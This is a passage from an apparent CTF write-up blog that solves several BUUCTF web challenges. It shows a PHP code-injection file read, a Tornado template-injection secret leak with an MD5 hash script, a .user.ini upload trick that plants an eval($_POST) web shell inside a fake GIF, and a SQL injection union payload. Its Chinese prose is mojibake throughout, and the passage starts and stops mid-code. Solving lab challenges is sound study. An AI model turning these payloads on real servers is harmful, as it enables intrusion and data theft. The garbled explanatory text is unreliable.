class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length();i++)&#123;<br>            <span class="hljs-type">int</span> temp=(<span class="hljs-type">int</span>)a.charAt(i);<br>            <span class="hljs-comment">//å¾—åˆ°å½“å‰å­—ç¬¦çš„ascii</span><br>            System.out.println(temp);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæ•´é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>å¾—åˆ°flagã€‚</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>éšä¾¿ç‚¹ç‚¹å‘ç°urlä¸­<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed</a><br>filehashçš„å€¼ï¼Œemmmç¬¬ä¸€çœ¼å°±è§‰å¾—æ˜¯åŠ å¯†ã€‚<br>æ¥ç€å‘ç°<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134238.png" alt="QQæˆªå›¾20220214134238"></p><p>ç›´æ¥ä¸ŠåŠ å¯†ã€‚<br>ä½†æ˜¯æ‰¾äº†ä¸€åœˆæ²¡æœ‰æ‰¾åˆ°cookieã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214134456.png" alt="QQæˆªå›¾20220214134456"></p><p>å›å¤´åˆæƒ³åˆ°renderã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214135041.png" alt="QQæˆªå›¾20220214135041"></p><p>æ²¡æœ‰æ€è·¯ï¼Œå°±åˆæŸ¥æ‰¾wpäº†ã€‚<br>å¾ˆå¥‡å¦™ï¼Œç«Ÿç„¶è”ç³»åˆ°é¢˜ç›®ã€‚è·Ÿç€wpæç¤ºåšä¸€ä¸‹ã€‚<br>ä¸€è·¯è·Ÿåˆ°åº•â€¦emmm<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140206.png" alt="QQæˆªå›¾20220214140206"></p><p><strong>æ€»ç»“ï¼šhandler æŒ‡å‘RequestHandler</strong></p><p><strong>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</strong></p><p><strong>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</strong></p><p>è¿™é‡Œå¦‚æœç›´æ¥è®¿é—®ï¼Œä¼šå‡ºç°500çš„é”™è¯¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140724.png" alt="QQæˆªå›¾20220214140724"></p><p>æ‰€ä»¥è¿™é‡Œå°±ä½“ç°å‡ºäº†ï¼Œä¸ºä»€ä¹ˆè¦é—´æ¥è®¿é—®ã€‚<br>ç„¶åè‡ªå·±è°ƒè¯•çš„ä¸€äº›é—®é¢˜ï¼šè¿™é‡Œå¥½åƒé“¾æ¥æ„é€ æˆï¼š0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81&#x2F;error?msg&#x3D;</p><p>msgåé¢è¾“å…¥ä»€ä¹ˆï¼Œé¡µé¢å°±ä¼šè¿”å›ä»€ä¹ˆã€‚è·Ÿä½œè€…è¯´çš„sstiæˆ‘è§‰å¾—æœ‰é—®é¢˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214141140.png" alt="QQæˆªå›¾20220214141140"></p><p>è¿™é‡Œå¦‚æœæ˜¯è®¡ç®—è¡¨è¾¾å¼å°±æ˜¯ä¸è¡Œã€‚ä½†æ˜¯è¿™é‡Œç¡®å®æ˜¯ç¬¦åˆsstiï¼Œemmmä¸ç†è§£ã€‚</p><p>ç®¡ä»–å‘¢ï¼Œç»§ç»­åšå­ã€‚<br>æ„é€ é“¾æ¥ï¼š<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=</a></p><p>å¾—åˆ°cookieï¼Œç„¶åå°±å»å†™ä»£ç å’¯ã€‚è‡ªå·±å¯¹ç€æ•²ä¸€éã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-comment">#åˆ›å»ºMD5åŠ å¯†å¯¹è±¡</span><br><span class="hljs-built_in">hash</span>.update(<span class="hljs-string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><span class="hljs-comment">#æ›´æ–°å¯¹è±¡è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè¦å…ˆUTF-8ç¼–ç æˆäºŒè¿›åˆ¶ï¼Œå› ä¸ºmd5åªåŠ å¯†äºŒè¿›åˆ¶</span><br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((<span class="hljs-string">&quot;20d70faf-6981-4604-ba00-9f57cb0c2569&quot;</span>+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br></code></pre></td></tr></table></figure><p>å°±æ˜¯æ³¨é‡Šmd5åŠ å¯†åˆå­¦åˆ°çŸ¥è¯†äº†ã€‚</p><p>æœ€ç»ˆé“¾æ¥:<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674</a></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>1ã€å¦‚æœurlä¸­å‚æ•°å±è”½äº†å­—æ¯ï¼Œå¯åœ¨å‚æ•°å‰+ä¸€ä¸ªå°ç©ºæ ¼ã€‚</p><p>2ã€scandirã€print_fã€file_get_contentsç­‰å‡½æ•°</p><p>3ã€çœ‹åˆ°renderå‚æ•°å¯è”ç³»åˆ°æ¨¡æ¿ï¼Œè”ç³»åˆ°sstiï¼ŒTornadoæä¾›åˆ«åå¿«é€Ÿè®¿é—®å¯¹è±¡ã€‚</p><p>4ã€RequestHandler.application.settingsç›®å‰ä¸çŸ¥é“å…·ä½“ä½œç”¨ï¼Œä¸­æ–‡ç¿»è¯‘ä¸€ä¸‹  è¯·æ±‚å¤„ç†ç¨‹åº .ç”³è¯·.è®¾ç½® ä¼°æ‘¸è¿™å°±æ˜¯æŸ¥çœ‹cookieï¼Ÿ</p><p>å½“ç„¶è¿™é‡Œç›´æ¥é€šè¿‡ handler.settingsã€‚</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸Šä¼ æ–‡ä»¶ã€‚æœ‰æºç å…ˆçœ‹æºç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);<br>if (!file_exists($userdir)) &#123;<br>    mkdir($userdir, 0777, true);<br>&#125;<br>file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);<br>if (isset($_POST[&quot;upload&quot;])) &#123;<br>    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];<br>    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];<br>    if (!$tmp_name) &#123;<br>        die(&quot;filesize too big!&quot;);<br>    &#125;<br>    if (!$name) &#123;<br>        die(&quot;filename cannot be empty!&quot;);<br>    &#125;<br>    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);<br>    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;<br>        die(&quot;illegal suffix!&quot;);<br>    &#125;<br>    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;<br>        die(&quot;&amp;lt;? in contents!&quot;);<br>    &#125;<br>    $image_type = exif_imagetype($tmp_name);<br>    if (!$image_type) &#123;<br>        die(&quot;exif_imagetype:not image!&quot;);<br>    &#125;<br>    $upload_file_path = $userdir . &quot;/&quot; . $name;<br>    move_uploaded_file($tmp_name, $upload_file_path);<br>    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;<br>    echo &#x27;Your files : &lt;br&gt;&#x27;;<br>    var_dump(scandir($userdir));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222210628.png" alt="QQæˆªå›¾20220222210628"></p><p>è¿‡æ»¤äº† <strong>&lt;?</strong><br>ç„¶åå¯ä»¥ä¸Šä¼ å›¾åƒç±»å‹çš„æ–‡ä»¶ã€‚<br>è¿™é‡Œå°±è®©æˆ‘æƒ³åˆ°äº†ä¸Šä¼ .htacessï¼Œä½†æ˜¯æ–‡ç« ä¸­ä¹Ÿæ˜¯è¿‡æ»¤æ‰äº†ã€‚<br>(è¿™é‡Œå°±èµ°å¤´æ— è·¯äº†ï¼Œçœ‹çœ‹wpï¼Œæç¤ºåˆ°apacheæ˜¯å¯ä»¥ç”¨.htacessï¼Œè€Œè¿™é‡Œç”¨çš„æœåŠ¡å™¨niginx)</p><p>ä¼˜åŠ¿ï¼šè·Ÿ<code>.htaccess</code>åé—¨æ¯”ï¼Œé€‚ç”¨èŒƒå›´æ›´å¹¿ï¼Œnginx&#x2F;apache&#x2F;IISéƒ½æœ‰æ•ˆï¼Œè€Œ<code>.htaccess</code>åªé€‚ç”¨äºapache</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222211627.png" alt="QQæˆªå›¾20220222211627"></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®<code>php.ini</code>ä¸­<strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI è®¾ç½®ï¼Œè€Œä¸”åªè¦æ˜¯åœ¨ä½¿ç”¨ <strong>CGIï¼FastCGI</strong> æ¨¡å¼çš„æœåŠ¡å™¨ä¸Šéƒ½å¯ä»¥ä½¿ç”¨<code>.user.ini</code></p><p>åœ¨pç‰›çš„æ–‡ç« ä¸­æåˆ°äº†ä¸¤ä¸ªæœ‰è¶£çš„è®¾ç½®ï¼š<strong>auto_prepend_file</strong>å’Œ<strong>auto_append_file</strong></p><p>æˆ‘ä»¬å†åˆ°æ‰‹å†Œä¸­çœ‹äº†ä¸‹è¿™ä¸¤ä¸ªè®¾ç½®çš„å®šä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212237.png" alt="QQæˆªå›¾20220222212237"></p><p>å¤§è‡´æ„æ€å°±æ˜¯ï¼šæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼š<code>require(./a.jpg);</code>ï¼ˆè¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆè¦å†™å…¥è·Ÿä¸Šä¼ æ–‡ä»¶çš„å›¾ç‰‡ä¸€ä¸ªå‘½åçš„åŸå› ã€‚ï¼‰</p><p>è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äº<strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰ã€‚</p><h3 id="è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰"><a href="#è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰"></a>è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰</h3><p>1ã€ä¸Šä¼ .user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p>2ã€ä¸Šä¼ a.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3ã€è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚<strong>upload&#x2F;md5(*)</strong><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220222212917.png" alt="QQæˆªå›¾20220222212917"></p><p>å¾—åˆ°flagã€‚</p><h3 id="ç»•è¿‡exif-imagetype-çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰"><a href="#ç»•è¿‡exif-imagetype-çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰" class="headerlink" title="ç»•è¿‡exif_imagetype()çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰"></a>ç»•è¿‡<code>exif_imagetype()</code>çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 10</span><br></code></pre></td></tr></table></figure><p>é‡‡ç”¨xbmæ ¼å¼X Bit Mapï¼Œç»•è¿‡exif_imagetype()æ–¹æ³•çš„æ£€æµ‹ï¼Œä¸Šä¼ æ–‡ä»¶æ¥è§£æã€‚<br> åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾ã€‚<br> XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆï¼Œå½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜.hæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚<br> ä¹Ÿå°±æ˜¯ç”¨cä»£ç æ¥æ ‡è¯†ä¸€ä¸ªxbmæ–‡ä»¶ï¼Œå‰ä¸¤ä¸ª#definesæŒ‡å®šä½å›¾çš„é«˜åº¦å’Œå®½åº¦ã€ä»¥åƒç´ ä¸ºå•ä½ï¼Œæ¯”å¦‚ä»¥ä¸‹xbmæ–‡ä»¶ï¼š<br> <code>#define test_width 16</code><br> <code>#define test_height 7</code></p><p>åªéœ€å°†ä¸Šè¿°æ–‡ä»¶ä¸­çš„GIF89aæ”¹ä¸º </p><p>#define width 20</p><p>#define height 10</p><p>å³å¯ã€‚</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>å°è¯•å¾ˆå¤šæ¬¡éƒ½æ˜¯å¤±è´¥ã€‚ç„¶åçªç„¶å‘ç°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223162344.png" alt="QQæˆªå›¾20220223162344"></p><p>è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆç¼–ç å‘¢ï¼Ÿå°è¯•è®¸ä¹…ä¸çŸ¥é“ã€‚æŸ¥äº†æŸ¥wpã€‚æ˜¯base32ã€‚ç„¶åæ˜¯base64ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æ€è·¯ã€‚å› ä¸ºæ ¹æœ¬ç»•ä¸è¿‡ã€‚è‚¯å®šè¿˜æœ‰åˆ«çš„æ ¡éªŒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br>&lt;title&gt;Do you know who am I?&lt;/title&gt;<br>&lt;?php<br>require &quot;config.php&quot;;<br>require &quot;flag.php&quot;;<br><br>// å»é™¤è½¬ä¹‰<br>if (get_magic_quotes_gpc()) &#123;<br>function stripslashes_deep($value)<br>&#123;<br>$value = is_array($value) ?<br>array_map(&#x27;stripslashes_deep&#x27;, $value) :<br>stripslashes($value);<br>return $value;<br>&#125;<br><br>$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);<br>$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);<br>$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);<br>$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);<br>&#125;<br><br>mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);<br>$name = $_POST[&#x27;name&#x27;];<br>$password = $_POST[&#x27;pw&#x27;];<br>$t_pw = md5($password);<br>$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;<br>// echo $sql;<br>$result = mysqli_query($con, $sql);<br><br><br>if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;<br>die(&quot;do not hack me!&quot;);<br>&#125;<br>else&#123;<br>if (!$result) &#123;<br>printf(&quot;Error: %s\n&quot;, mysqli_error($con));<br>exit();<br>&#125;<br>else&#123;<br>// echo &#x27;&lt;pre&gt;&#x27;;<br>$arr = mysqli_fetch_row($result);<br>// print_r($arr);<br>if($arr[1] == &quot;admin&quot;)&#123;<br>if(md5($password) == $arr[2])&#123;<br>echo $flag;<br>&#125;<br>else&#123;<br>die(&quot;wrong pass!&quot;);<br>&#125;<br>&#125;<br>else&#123;<br>die(&quot;wrong user!&quot;);<br>&#125;<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>1ã€åœ¨nameä¸­è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ä»¥åŠorã€‚</p><p>2ã€mysqli_queryï¼ˆï¼‰å¯¹æ•°æ®åº“è¿›è¡Œä¸€æ¬¡æŸ¥è¯¢</p><p>3ã€mysqli_fetch_row() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œï¼Œå¹¶ä½œä¸ºæšä¸¾æ•°ç»„è¿”å›ã€‚<br>4ã€md5åŠ å¯†åè¦ä¸æ•°ç»„arr[2]å¼±ç±»å‹æ¯”è¾ƒã€‚</p><p>5ã€å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹<code>$result = mysqli_query($con, $sql);</code>è¿™é‡Œå¿…é¡»æ˜¯æœ‰ä¸€ä¸ªsqlçš„æŸ¥è¯¢è¯­å¥ï¼Œä¸ç„¶ä¼šç›´æ¥é€€å‡ºï¼ˆç”±ä¸‹æ–¹åˆ¤æ–­å¾—å‡ºï¼‰ã€‚</p><p>6ã€è¿™é‡Œä¸æ˜¯å¾ˆèƒ½ç†è§£sqlè¯­å¥<code>$sql = &quot;select * from user where username = &#39;&quot;.$name.&quot;&#39;&quot;;</code>,æ‹¼æ¥è¿›å»åˆ°åº•æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚è¯¢é—®äº†h3å¸ˆå‚…ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223170735.png" alt="QQæˆªå›¾20220223170735"></p><p><strong><code>å¤§çˆ±h3</code></strong></p><p>å°´å°¬ï¼Œè¢«æ•™è®­äº†ã€‚æˆ‘è‡ªå·±åŠ¨æ‰‹ï¼Œè®¾ç½®çš„å˜é‡æ²¡æœ‰åŠ <code>&quot;&quot;</code>,è¢«éª‚çš„å¦¥å¦¥çš„ï¼Œé”™äº†é”™äº†ä¸‹æ¬¡ä¸€å®šè¿˜æ•¢å“ˆå“ˆå“ˆå“ˆã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220223171831.png" alt="QQæˆªå›¾20220223171831"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>1ã€<code>name=ad&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code></p><p>2ã€<code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;åŠ å¯†åçš„md5&#39;#&amp;pw[]=ä»»æ„å¾…MD5åŠ å¯†çš„å¯†ç </code>ï¼ˆæœ¬äººæ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ²¡æœ‰å…·ä½“çš„æ•°æ®åº“ä¹Ÿä¸èƒ½è·Ÿè¿›æŸ¥çœ‹ï¼‰ã€‚</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) 